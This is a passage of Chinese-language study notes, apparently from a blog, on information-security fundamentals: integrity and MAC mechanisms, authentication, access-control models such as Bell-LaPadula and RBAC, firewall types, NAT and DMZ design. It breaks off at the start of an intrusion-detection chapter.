class="headerlink" title="4.1.信息系统安全体系框架"></a>4.1.信息系统安全体系框架</h2><p>信息系统安全的<u>总需求</u>是<strong>物理安全、网络安全、 信息内容安全、应用系统安全和安全管理的</strong>总和</p><p>安全的<u>最终目标</u>是确保信息的<strong>机密性、完整性、可用性、可控性和抗抵赖性</strong>，以及<strong>信息系统主体 (包括用户、团体、社会和国家)对信息资源的控制</strong>。</p><p>完整的信息系统安全体系框架由<strong>技术体系、组织机构体系和管理体系</strong>共同构建</p><ul><li>技术体系<br>物理安全技术、系统安全技术</li><li>组织机构体系<br>机构、岗位、人事三个模块</li><li>管理体系<br>法律管理、制度管理、培训管理<br><del>三分技术，七分管理；</del>（这种说法是不太合适的！要说管理和技术并重）管理与技术并重。</li></ul><h2 id="4-2-网络空间安全体系框架"><a href="#4-2-网络空间安全体系框架" class="headerlink" title="4.2.网络空间安全体系框架"></a>4.2.网络空间安全体系框架</h2><p>管理体系管理是信息系统安全的灵魂。</p><p>信息系统安全的管理体系由<u>法律管理、制度管理和培训管理</u>三个部分组成。（<del>三分技术，七分管理；</del>）<strong>管理与技术并重</strong>。</p><ul><li>法律管理是根据相关的国家法律、法规对信息系统 主体及其与外界关联行为的规范和约束。 </li><li>制度管理是信息系统内部依据系统必要的国家、团 体的安全需求制定的一系列内部规章制度。 </li><li>培训管理是确保信息系统安全的前提。</li></ul><h2 id="4-3-数据完整性机制"><a href="#4-3-数据完整性机制" class="headerlink" title="4.3.数据完整性机制"></a>4.3.数据完整性机制</h2><p>完整性检测，不符合完整性检测要求则重发数据</p><p>定义：数据完整性是<strong>防止</strong>非法实体对交换数据的修改、插入、替换和删除，或者如果被修改、插入、替换和删除时<strong>可以被检测出来</strong>。数据完整性可以通过消息认证模式来保证。</p><p>完整性机制分类：</p><ul><li>通过密码学提供完整性</li><li>通过上下文提供完整性</li><li>通过探测和确认提供完整性</li><li>通过阻止提供完整性</li></ul><h2 id="4-4-数字签名机制"><a href="#4-4-数字签名机制" class="headerlink" title="4.4.数字签名机制"></a>4.4.数字签名机制</h2><p>传统签名的基本特点：</p><ul><li>能与被签的文件在物理上不可分割</li><li>签名者不能否认自己的签名</li><li>签名不能被伪造</li><li>容易被验证</li></ul><p><strong>数字签名的基本要求：</strong></p><ul><li>能与所签文件“绑定”</li><li>签名者不能否认自己的签名</li><li>签名不能被伪造</li><li>容易被验证</li></ul><p><strong>数字签名的特性：</strong></p><ul><li><p>不可伪造性</p><ul><li>没有私钥，很难伪造一个合法的数字签名。</li></ul></li><li><p>抗抵赖性</p><ul><li>对普通数字签名，任何人可用签名者的公钥验证签名的有效性。</li></ul></li><li><p>保证消息完整性</p><ul><li>可以防止消息被篡改。</li></ul></li></ul><h2 id="4-5-公钥加密模型"><a href="#4-5-公钥加密模型" class="headerlink" title="4.5.公钥加密模型"></a>4.5.公钥加密模型</h2><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 15.08.25.png" alt="截屏2024-12-24 15.08.25" style="zoom: 25%;" /><h2 id="4-6-消息鉴别码"><a href="#4-6-消息鉴别码" class="headerlink" title="4.6.消息鉴别码"></a>4.6.消息鉴别码</h2><ul><li><p>在网路通信中，有一些针对消息内容的攻击方法（面临的风险）：</p><ul><li>伪造消息</li><li>窜改消息内容</li><li>改变消息顺序</li><li>消息重放或者延迟</li></ul></li><li><p>消息认证：对收到的消息进行验证，确保消息确实是来自声称的发送方，并且没有被修改过。</p><ul><li>如果在消息中加入时间及顺序信息，则可以完成对时间和顺序的鉴别，增强消息的安全性。</li></ul></li></ul><p>消息鉴别的三种方式：</p><ul><li><p>Message encryption（消息加密）：用整个消息的密文作为鉴别标识</p><ul><li>接收方必须能够识别错误。</li></ul></li><li><p>Hash function（哈希函数）：一个公开函数将任意长度的消息映射到一个固定长度的散列值，作为鉴别标识</p></li><li><p>MAC（消息认证码）：一个公开函数，加上一个密钥产生一个固定长度的值作为鉴别标识。</p><ul><li><p>步骤1: A根据要发送的消息M0，利用密钥K通过MAC产生函数C产生MAC0&#x3D;Ck(M0);</p><p> 步骤2: A将M0和MAC0合在一起，并通过网络发送到B;</p><p> 步骤3: B收到信息后，并将二者分开，设为M1和MAC1;</p><p> 步骤4: B利用密钥K对收到的信息M1用与A相同的MAC产生函数C重新计算M1的验证码，设为MAC2，</p><p> 步骤5: B比较MAC2和MAC1是否相同，如果相等，B断定数据是完整的，如果不相等，则B断定数据遭到篡改。</p></li></ul></li></ul><p>通过消息鉴别码**<u>对数据完整性</u>**进行验证的技术实现思路：</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 15.12.09.png" alt="截屏2024-12-24 15.12.09" style="zoom: 25%;" /><h1 id="CH5-鉴别机制与技术"><a href="#CH5-鉴别机制与技术" class="headerlink" title="CH5-鉴别机制与技术"></a>CH5-鉴别机制与技术</h1><h2 id="5-1-对身份鉴别系统的要求"><a href="#5-1-对身份鉴别系统的要求" class="headerlink" title="5.1.对身份鉴别系统的要求"></a>5.1.对身份鉴别系统的要求</h2><p> （1）验证者正确识别合法申请者的概率极大化。</p><p> （2）不具有可传递性（Transferability)</p><p> （3）攻击者伪装成申请者欺骗验证者成功的概率要小到可以忽略的程度</p><p> （4）计算有效性</p><p> （5）通信有效性</p><p> （6）秘密参数能安全存储</p><p>（补充点别太在意）</p><h2 id="5-2-实现身份鉴别的途径"><a href="#5-2-实现身份鉴别的途径" class="headerlink" title="5.2.实现身份鉴别的途径"></a>5.2.实现身份鉴别的途径</h2><p>设计依据：安全水平、系统通过率、用户可接受性、成本等。</p><ul><li>基于你所知道的（What you know ）<ul><li><strong>知识、口令、密码</strong></li></ul></li><li>基于你所拥有的（What you have ）<ul><li><strong>身份证、信用卡、钥匙、智能卡、令牌等</strong></li></ul></li><li>基于你的个人特征（What you are）<ul><li><strong>指纹，笔迹，声音，手型，脸型，视网膜，虹膜</strong></li></ul></li><li>双因素、多因素认证</li></ul><h2 id="5-3-基于质询－应答的身份鉴别技术"><a href="#5-3-基于质询－应答的身份鉴别技术" class="headerlink" title="5.3.&#x3D;&#x3D;基于质询－应答的身份鉴别技术&#x3D;&#x3D;"></a>5.3.&#x3D;&#x3D;基于质询－应答的身份鉴别技术&#x3D;&#x3D;</h2><p>这是第四级身份鉴别</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/image-20241224220703542.png" alt="image-20241224220703542" style="zoom: 25%;" /><p>基于质询—应答的身份鉴别在鉴别时，由验证者给声称者发送一个确定的值（质询消息），该值参与鉴别信息的运算。产生的非重复质询消息完全由验证者决定，使得每次传输的鉴别信息不同。这能很好地<strong>防止口令窃听和重放</strong>，但需要额外的通信花销。</p><hr><ul><li><p>产生非重复值的能力完全掌握在验证者手中。提供了一种很好的重放检测能力。</p></li><li><p>附加的复杂协议意味着这种机制不能与传统的简单口令协议结合使用。</p></li></ul><p>质询—响应的身份鉴别，其安全性取决于</p><ul><li><p>散列函数的安全性；</p></li><li><p>由于是单向鉴别，还存在着验证者的假冒和重放攻击。（这可以通过双向鉴别或时间戳来解决）</p></li></ul><hr><p><strong>质询应答方式(Challenge&#x2F;Response)与过程</strong></p><ul><li><p>A期望从B获得一个消息</p><ul><li><p>首先发给B一个随机值(challenge)</p></li><li><p>B收到这个值之后，对它作某种变换，并送回去</p></li><li><p>A收到B的response，希望包含这个随机值</p></li></ul></li><li><p>询问应答方法不适应非连接性的应用，因为它要求在传输开始之前先有握手的额外开销，这就抵消了无连接通信的主要特点。</p></li></ul><h1 id="CH6-访问控制机制与技术"><a href="#CH6-访问控制机制与技术" class="headerlink" title="CH6-访问控制机制与技术"></a>CH6-访问控制机制与技术</h1><h2 id="6-1-访问控制的概念和目标"><a href="#6-1-访问控制的概念和目标" class="headerlink" title="6.1.访问控制的概念和目标"></a>6.1.访问控制的概念和目标</h2><ul><li><p>访问控制的概念：针对越权或未授权使用资源的防御措施</p></li><li><p>目标：防止对任何资源（如计算资源、通信资源或信息资源）进行未授权的访问，从而使资源在 授权范围内使用，决定用户能做什么，也决定代表一定用户利益的程序能做什么。</p></li></ul><h2 id="6-2-访问控制模型的分类"><a href="#6-2-访问控制模型的分类" class="headerlink" title="6.2.访问控制模型的分类"></a>6.2.访问控制模型的分类</h2><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 22.15.21.png" alt="截屏2024-12-24 22.15.21" style="zoom: 25%;" /><h3 id="6-2-1-自主访问控制-Discretionary-Access-Control-DAC"><a href="#6-2-1-自主访问控制-Discretionary-Access-Control-DAC" class="headerlink" title="6.2.1.自主访问控制-Discretionary Access Control , DAC"></a>6.2.1.自主访问控制-Discretionary Access Control , DAC</h3><p>自主访问控制的含义</p><ul><li>允许客体的属主（创建者）决定主体对该客体的 访问权限<ul><li>灵活地调整安全策略</li><li>具有较好的易用性和可扩展性</li><li>常用于商业系统</li><li>安全性不高</li></ul></li><li><strong>DAC是一种分布式授权管理的模式</strong></li></ul><p>自主访问控制的特点</p><ul><li>优点<ul><li>根据主体的身份和访问权限进行决策</li><li>具有某种访问能力的主体能够<strong>自主地</strong>将访问权的某个子集授予其它主体</li><li><strong>灵活</strong>性高，被大量采用</li></ul></li><li>缺点<ul><li>信息在传递过程中其访问权限关系会<strong>被改变</strong></li></ul></li></ul><h3 id="6-2-2-强制访问控制-Mandatory-Access-Control，MAC"><a href="#6-2-2-强制访问控制-Mandatory-Access-Control，MAC" class="headerlink" title="6.2.2.&#x3D;&#x3D;强制访问控制-Mandatory Access Control，MAC&#x3D;&#x3D;"></a>6.2.2.&#x3D;&#x3D;强制访问控制-Mandatory Access Control，MAC&#x3D;&#x3D;</h3><p><strong>强制访问控制的含义</strong></p><p>主体对客体的所有访问请求按照强制访问控制策略进行控制，客体的属主<strong>无权</strong>控制客体的访问权限， 以防止对信息的非法和越权访问</p><ul><li><strong>主体和客体分配</strong>有一个安全属性</li><li>应用于<strong>军事</strong>等安全要求较高的系统</li><li>可<strong>与自主访问控制结合</strong>使用</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 21.45.04.png" alt="截屏2024-12-26 21.45.04" style="zoom: 25%;" /><p>强制型访问控制（MAC）特点：</p><ul><li>将主体和客体分级，根据主体和客体的级别标记来决定访问模式。</li><li>其访问控制关系分为：<u>上读&#x2F;下写（完整性），下读&#x2F;上写（机密性）</u>。</li><li>通过梯度安全标签实现单向信息流通模式。</li></ul><hr><p>四种强制访问控制策略规定：</p><ul><li><p><strong>下读</strong>：用户级别大于文件级别的读操作。</p></li><li><p><strong>上写</strong>：用户级别低于文件级别的写操作。</p></li><li><p><strong>下写</strong>：用户级别大于文件级别的写操作。</p></li><li><p><strong>上读</strong>：用户级别低于文件级别的读操作。</p></li></ul><p>强制访问控制——下读&#x2F;上写<u>（上写机密性）</u></p><ul><li><strong>向下读 (Read Down, rd)</strong><ul><li>主体高于客体时允许读</li><li>低级别用户不能读高敏感度的信息</li></ul></li><li><strong>向上写 (Write Up, wr)</strong><ul><li>主体低于客体时允许写</li><li>不允许高敏感度的信息写入低敏感度区域</li></ul></li></ul><p>信息流只能从低级别流向高级别，从而保证<strong>数据机密性</strong>。</p><p>强制访问控制——上读&#x2F;下写<u>（下写完整性）</u></p><ul><li><strong>向上读 (Read Up, ru)</strong><ul><li>主体低于客体时允许读操作</li><li>低信任级别的用户能够读高敏感度的信息</li></ul></li><li><strong>向下写 (Write Down, wd)</strong><ul><li>主体高于客体时允许写操作</li><li>允许高敏感度的信息写入低敏感度区域</li></ul></li></ul><p>实现<strong>数据完整性</strong>要求</p><blockquote><p><strong><u>下读上写机密性，上写下读完整性</u></strong></p></blockquote><p>&#x3D;&#x3D;下图会画！&#x3D;&#x3D;</p><p>（选择题会考保证了机密性还是保证了完整性，哪个是机密性哪个是完整性）</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 22.24.58.png" alt="截屏2024-12-24 22.24.58" style="zoom: 25%;" /><h2 id="6-3-常见的强制访问控制模型"><a href="#6-3-常见的强制访问控制模型" class="headerlink" title="6.3.常见的强制访问控制模型"></a>6.3.常见的强制访问控制模型</h2><ul><li>BLP模型<ul><li>1973年提出的多级安全模型，影响了许多其他模型的发展，甚至很大程度上影响了计算机安全技术的发展</li></ul></li><li>Biba模型<ul><li>1977年，Biba提出的一种在数学上与BLP模型对偶的完整性保护模型</li></ul></li><li>Clark-Wilson模型<ul><li>1987年，David Clark和David Wilson开发的以事物处理为基本操作的完整性模型，该模型应用于多种商业系统</li></ul></li><li>Chinese Wall模型（别太在意）<ul><li>1989年，D. Brewer和M. Nash提出的同等考虑保密性与完整性的安全策略模型，主要用于解决商业中的利益冲突</li></ul></li></ul><h3 id="6-3-1-Bell－LaPadula-BLP-模型"><a href="#6-3-1-Bell－LaPadula-BLP-模型" class="headerlink" title="6.3.1.&#x3D;&#x3D;Bell－LaPadula(BLP)模型&#x3D;&#x3D;"></a>6.3.1.&#x3D;&#x3D;Bell－LaPadula(BLP)模型&#x3D;&#x3D;</h3><ul><li><p><u>下读&#x2F;上写</u></p></li><li><p><strong><u>保证机密性</u></strong></p></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 16.59.13.png" alt="截屏2024-12-25 16.59.13" style="zoom: 25%;" /><h3 id="6-3-2-基于角色的访问控制-RBAC"><a href="#6-3-2-基于角色的访问控制-RBAC" class="headerlink" title="6.3.2.基于角色的访问控制-RBAC"></a>6.3.2.基于角色的访问控制-RBAC</h3><ul><li>基本思想<ul><li>根据用户所担任的角色来决定用户在系统中的访问权限。</li><li>用户必须扮演并激活某种角色，才能访问对象或执行某种操作。</li></ul></li><li>特点<ul><li><strong>便于授权管理</strong>，如系统管理员需要修改系统设置等内容时，必须有几个不同角色的用户到场方能操作，增强了安全性</li><li><strong>便于处理工作分级</strong>，如文件等资源分级管理</li><li><strong>利于安全约束</strong>，容易实现各种安全策略，如最小特权、 职责分离等</li><li><strong>便于任务分担</strong>，不同角色完成不同的任务</li></ul></li></ul><h1 id="CH7-防火墙技术及其发展"><a href="#CH7-防火墙技术及其发展" class="headerlink" title="CH7-防火墙技术及其发展"></a>CH7-防火墙技术及其发展</h1><h2 id="7-1-防火墙的基本概念"><a href="#7-1-防火墙的基本概念" class="headerlink" title="7.1.防火墙的基本概念"></a>7.1.防火墙的基本概念</h2><p>防火墙定义：</p><ul><li><p>在网络间（内部&#x2F;外部网络、不同信息级别）提供<strong>安全连接</strong>的设备</p></li><li><p>用于<strong>实现和执行</strong>网络之间通信的<u>安全策略</u>（预先设定的安全策略）</p></li></ul><h2 id="7-2-防火墙的检测与过滤技术"><a href="#7-2-防火墙的检测与过滤技术" class="headerlink" title="7.2.防火墙的检测与过滤技术"></a>7.2.防火墙的检测与过滤技术</h2><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 17.10.17.png" alt="截屏2024-12-25 17.10.17" style="zoom: 25%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 17.12.04.png" alt="截屏2024-12-25 17.12.04" style="zoom: 25%;" /><ul><li>包过滤（Packet Filtering）：工作在网络层，仅根据<strong>数据包头中</strong>的IP地址、端口号、协议类型等标志确定是否允许数据包通过。</li><li>应用代理（Application Proxy）：工作在<strong>应用层</strong>，通过编写不同的应用代理程序，实现对应用层数据的检测和分析。</li><li>状态检测（Stateful Inspection）：工作在2~4层，访问控制方式与1同，但处理的对象不是单个数据包，而是整个连接，通过规则表和连接状态表，综合判断是否允许数据包通过。</li><li>完全内容检测（Compelete Content Inspection）：工作在2~7层，不仅分析数据包头信息、状态信息，而且对应用层协议进行还原和内容分析，有效防范混合型安全威胁。</li></ul><h2 id="7-3-包过滤防火墙"><a href="#7-3-包过滤防火墙" class="headerlink" title="7.3.包过滤防火墙"></a>7.3.包过滤防火墙</h2><p>工作原理</p><ul><li>简单包过滤防火墙不检查数据区</li><li>简单包过滤防火墙不建立连接状态表</li><li>前后报文无关</li><li>应用层控制很弱</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 17.18.10.png" alt="截屏2024-12-25 17.18.10" style="zoom: 25%;" /><p>包过滤防火墙具有以下特点： </p><ul><li>优点：<ul><li>只对数据包的 IP 地址、 TCP&#x2F;UDP 协议和端口进行分析，规则简单，处理速度较快</li><li>易于配置</li><li>对用户透明-用户访问时不需要提供额外的密码或使用特殊的命令</li></ul></li><li>缺点：<ul><li>检查和过滤器只在网络层——不能识别应用层协议或维持连接状态</li><li>安全性薄弱-不能防止IP欺骗等</li><li>静态策略可能成为漏洞</li></ul></li></ul><h2 id="7-4-应用代理防火墙"><a href="#7-4-应用代理防火墙" class="headerlink" title="7.4.应用代理防火墙"></a>7.4.应用代理防火墙</h2><p><strong>应用网关或代理（ Application Gateway or Proxy）</strong></p><p>工作原理</p><ul><li><u>不检查IP、TCP报头，只查数据</u></li><li>不建立连接状态表</li><li>网络层保护比较弱</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 17.27.17.png" alt="截屏2024-12-25 17.27.17" style="zoom: 25%;" /><p>应用代理或网关防火墙具有以下特点</p><p>优点：</p><ul><li>可以检查应用层、传输层和网络层的协议特征，对数据包的检测能力比较强</li><li>提供良好的安全性——所有数据的有效负载都在应用层进行检查</li></ul><p>缺点：</p><ul><li>支持的应用数量有限，无法很好的支持新的应用、技术和协议</li><li>对用户不透明</li><li>性能表现欠佳</li></ul><p>但是，自适应代理技术的出现让应用代理防火墙技术出现了新的转机，它结合了代理防火墙的安全性和包过滤防火墙的高速度等优点，在不损失安全性的基础上大大提高了代理防火墙的性能。</p><h2 id="7-5-状态监测防火墙"><a href="#7-5-状态监测防火墙" class="headerlink" title="7.5.状态监测防火墙"></a>7.5.状态监测防火墙</h2><ul><li>内置TCP&#x2F;IP协议状态机，创建<strong>状态表</strong>用于维护连接上下文，检查每个会话连接的合法性<br>（是否符合TCP&#x2F;IP 通信原理和特征）。</li><li>能够识别和监听常用动态端口应用的协商过程，从而自动为动态应用建立通过防火墙的安全连接。</li></ul><p>状态检测防火墙摒弃了包过滤防火墙“仅考查数据包的 IP 地址等几个参数，而<u>不关心数据包连接状态变化</u>”的缺点，在防火墙的核心部分建立状态连接表，并将进出网络的数据当成一个个的会话，利用状态表跟踪每一个会话状态。状态监测对每一个包的检查不仅根据规则表， 更考虑了数据包是否符合会话所处的<strong>状态</strong>，因此提供了完整的对传输层的控制能力。</p><p>工作原理</p><ul><li>不检查数据区</li><li>建立连接状态表</li><li>前后报文相关</li><li>应用层控制很弱</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 17.45.57.png" alt="截屏2024-12-25 17.45.57" style="zoom: 25%;" /><p>状态检测防火墙具有以下特点：</p><ul><li><u>性能大大提高</u></li><li><u>支持大量应用</u></li><li><u>在内核级实现检测过滤</u><ul><li>在所有接口对进&#x2F;出的数据包进行状态检查</li></ul></li><li><u>支持应用层协议检查</u><ul><li>在动态状态表中存储连接状态</li><li>检查对外的连接并预先计算出将返回的连接</li></ul></li></ul><blockquote><p>状态检测技术在大为提高安全防范能力的同时，也改进了流量处理速度。状态监测技术采用了一系列优化技术，使防火墙性能大幅度提升，能应用在各类网络环境中，尤其是在一些规则复杂的大型网络上。 从 2000 年开始，国内的著名防火墙公司都开始采用这一新的体系架构。</p></blockquote><h2 id="7-6-完全内容检测防火墙"><a href="#7-6-完全内容检测防火墙" class="headerlink" title="7.6.完全内容检测防火墙"></a>7.6.完全内容检测防火墙</h2><p>工作原理</p><ul><li>网络层保护强</li><li>应用层保护强</li><li>会话保护很强</li><li>上下文相关</li><li>前后报文有联系</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 20.39.46.png" alt="截屏2024-12-25 20.39.46" style="zoom: 25%;" /><h2 id="7-7-地址转换-NAT"><a href="#7-7-地址转换-NAT" class="headerlink" title="7.7.地址转换-NAT"></a>7.7.地址转换-NAT</h2><p>通过防火墙实现</p><ul><li>隐藏了内部网络的结构</li><li>内部网络可以使用私有IP地址</li><li>公开地址不足的网络可以使用这种方式提供IP复用功能</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 20.45.39.png" alt="截屏2024-12-25 20.45.39" style="zoom: 25%;" /><h2 id="7-8-地址-端口映射-MAP"><a href="#7-8-地址-端口映射-MAP" class="headerlink" title="7.8.地址&#x2F;端口映射-MAP"></a>7.8.地址&#x2F;端口映射-MAP</h2><blockquote><p>一、端口映射（Port Mapping）<br>        端口映射是将外网主机的IP地址的一个端口映射到内网中，一台机器提供相应的服务。当用户访问该IP的这个端口时，服务器会自动将请求映射到对应局域网内部的机器上。</p><p>端口映射过程就如同：你的办公室在一个商务楼15楼（ip）2810室（port），你有快递要通过快递公司寄出去， 你写好邮寄地址，放到门卫，门卫那边的快递公司就给你寄出去了；当有你的快递运送到商务楼，门卫收到后，知道你公司在2810室，然后就直接送到你的办公室。端口映射的目的是传输数据，数据如何进来，又如何发出去，通过端口映射可以达到和公网上的网络设备通信的目的。</p><p><a href="https://blog.csdn.net/weixin_70208651/article/details/135708705">https://blog.csdn.net/weixin_70208651/article/details/135708705</a></p></blockquote><p>通过防火墙实现</p><ul><li><p>公开服务器可以使用私有地址</p></li><li><p>隐藏内部网络的结构</p></li></ul><p>![截屏2024-12-25 20.49.50](.&#x2F;attachments&#x2F;截屏2024-12-25 20.49.50.png)</p><h2 id="7-9-IP与MAC（用户）绑定"><a href="#7-9-IP与MAC（用户）绑定" class="headerlink" title="7.9.IP与MAC（用户）绑定"></a>7.9.IP与MAC（用户）绑定</h2><p>通过防火墙来实现绑定</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.00.02.png" alt="截屏2024-12-25 21.00.02" style="zoom: 25%;" /><h2 id="7-10-防火墙的工作接入方式"><a href="#7-10-防火墙的工作接入方式" class="headerlink" title="7.10.防火墙的工作接入方式"></a>7.10.防火墙的工作接入方式</h2><ul><li><p>路由接入方式（配置ip），防火墙相当于一个简单的路由器</p></li><li><p>透明接入方式（不配置ip），防火墙相当于网桥，原网络结构没有改变</p></li><li><p>混合接入方式</p><ul><li><p>工作于透明接入模式的防火墙可以实现透明接入。</p></li><li><p>工作于路由模式的防火墙可以实现不同网段的连接。</p></li><li><p>路由接入模式的优点和透明接入模式的优点是不能同时并存的。</p></li><li><p>大多数的防火墙一般同时保留了透明接入模式和路由接入模式。</p></li><li><p>根据用户网络情况及用户需求，在使用时由用户进行选择。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.07.10.png" alt="截屏2024-12-25 21.07.10" style="zoom: 25%;" /></li></ul></li></ul><h2 id="关于被屏蔽子网-DMZ区"><a href="#关于被屏蔽子网-DMZ区" class="headerlink" title="关于被屏蔽子网-DMZ区"></a>关于被屏蔽子网-DMZ区</h2><p>既允许来自非信任的外部网络的访问也允许来自内部网络的访问，但不允许数据流在这两个网络之间流动的中间子网。</p><p><a href="https://blog.csdn.net/m0_58983558/article/details/127452484">https://blog.csdn.net/m0_58983558/article/details/127452484</a></p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.10.23.png" alt="截屏2024-12-25 21.10.23" style="zoom: 25%;" /><p><img src="/./attachments/2820072-20221103223436008-301211690.png" alt="img"></p><p>通常被屏蔽子网体系结构的防火墙由四个部分组成：周边网络、外部路由器、内部路由器和堡垒主机。</p><ul><li>周边网络，它是处于非安全、不可信的外部网络与可信的内部网络之间的一个附加网络。周边网络与外部网络，周边网络与内部网络之间都是通过屏蔽路由器实现逻辑隔离的。外部用户想要访问内部网络需要通过两道屏蔽路由器才能访问内部的资源，通常仅能访问周边网络中的资源。外部用户即使入侵了周边网络中的堡垒主机，也无法监听到内部网络的信息。</li><li>外部路由器，它的主要作用是保护周边网络和内部网络，是整个屏蔽子网体系结构的第一道屏障。在外部路由器上设置了对周边网络DMZ和内部网络进行访问的过滤规则，通过这些规则可以限制外网用户只能访问周边网络不能访问内部网络，或者只允许外网用户访问内部网络的部分主机、部分服务。</li><li>内部路由器，它用于隔离周边网络和内部网络，是屏蔽子网体系结构的第二道屏障。在内部路由器上设置了针对内部用户的访问过滤规则，对内部用户访问周边网络和外部网络进行了限制。一些规则可以限制内部网络用户只可以访问周边网络不允许访问外部网络。内部路由器会复制外部路由器的过滤规则，这样可以防止外部路由器过滤功能失效所带来的严重后果。内部路由器还要限制周边网络的堡垒主机和内部网络之间的访问，这样可以减轻在堡垒主机被入侵的情况下，内部网络和服务的正常运行。</li><li>堡垒主机，它处于周边网络中，可以向外部用户提供WWW服务、FTP服务，能够接受外部网络用户的服务资源请求的访问。它也可以向内部网络用户提供DNS，电子邮件、WWW代理、FTP代理等多种服务，是内部网络用户访问外部网络资源的接口。</li><li>被屏蔽子网体系结构的防火墙与双重宿主主机体系结构和被屏蔽子网体系结构相比，安全性更高：外部路由器和内部路由器构成了双层的防护体系；外部路由器和内部路由器上的过滤规则避免了路由器失效产生的安全隐患。但是这个体系结构也有它的不足：构建被屏蔽子网体系的建设成本相对比较高；配置也比较复杂，需要维护人员的专业化程度更高，容易出现配置错误导致的安全隐患。</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.49.40.png" alt="截屏2024-12-25 21.49.40" style="zoom: 25%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.09.08.png" alt="截屏2024-12-25 21.09.08" style="zoom: 25%;" /><p>![截屏2024-12-25 21.50.00](.&#x2F;attachments&#x2F;截屏2024-12-25 21.50.00.png)</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.50.39.png" alt="截屏2024-12-25 21.50.39" style="zoom: 25%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.52.02.png" alt="截屏2024-12-25 21.52.02" style="zoom: 25%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.52.16.png" alt="截屏2024-12-25 21.52.16" style="zoom: 25%;" /><h2 id="7-11-衡量防火墙性能的五大指标"><a href="#7-11-衡量防火墙性能的五大指标" class="headerlink" title="7.11.衡量防火墙性能的五大指标"></a>7.11.衡量防火墙性能的五大指标</h2><ul><li><p>吞吐量：该指标直接影响网络的性能，吞吐量 </p></li><li><p>时延：入口处输入帧最后1个比特到达至出口处输出帧的第1个比特输出所用的时间间隔</p></li><li><p>丢包率：在稳态负载下，应由网络设备传输，但由于资源缺乏而被丢弃的帧的百分比</p></li><li><p>背靠背：从空闲状态开始，以达到传输介质最小合法间隔极限的传输速率发送相当数量的固定长度的帧，当出现第一个帧丢失时，发送的帧数。背靠背是体现防火墙对突发数据的处理能力。</p><blockquote><p>通俗来说，“背靠背”测试就像是你尽可能快地通过网络发送数据到阈值，直到网络开始丢包，然后你看看在丢包发生之前你成功发送了多少数据。这有助于了解你的网络在高负载下的表现如何。</p><p>衡量标准：背对背包主要是指防火墙缓冲容量的大小 ,网络上经常有一 些应用会产生大量的突发数据包（例如：NFS，备份，路由更新等）， 而且这样的数据包的丢失可能会产生更多的数据包的丢失，强大缓冲能 力可以减小这种突发对网络造成的影响。</p></blockquote></li><li><p>并发连结数：并发连接数是指穿越防火墙的主机之间或主机与防火墙之间能同时建立的最大连接数</p></li></ul><h2 id="7-12-防火墙的功能"><a href="#7-12-防火墙的功能" class="headerlink" title="7.12.防火墙的功能"></a>7.12.防火墙的功能</h2><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.09.48.png" alt="截屏2024-12-25 21.09.48" style="zoom: 25%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-25 21.03.48.png" alt="截屏2024-12-25 21.03.48" style="zoom: 25%;" /><h2 id="7-13-注意"><a href="#7-13-注意" class="headerlink" title="7.13.注意"></a>7.13.注意</h2><p>政务内网&amp;外网之间的网闸：物理隔离</p><p>政务外网&amp;互联网之间的防火墙：逻辑隔离</p><h1 id="CH8-入侵检测"><a href="#CH8-入侵检测" class="headerlink" title="CH8-入侵检测"></a>CH8-入侵检测</h1><h2 id="8-1-什么是入侵"><a href="#8-1-什么是入侵" class="headerlink" title="8.1.什么是入侵"></a>8.1.什么是入侵</h2><p>入侵（Intrusion）是指在<strong>非法或未经授权</strong>的情况下， 试图存取或处理系统或网络中的信息，或破坏系统或网络正常运行，致使系统或网络的机密性、完整行和可用性受到破坏的故意行为。</p><h2 id="8-2-入侵检测模型"><a href="#8-2-入侵检测模型" class="headerlink" 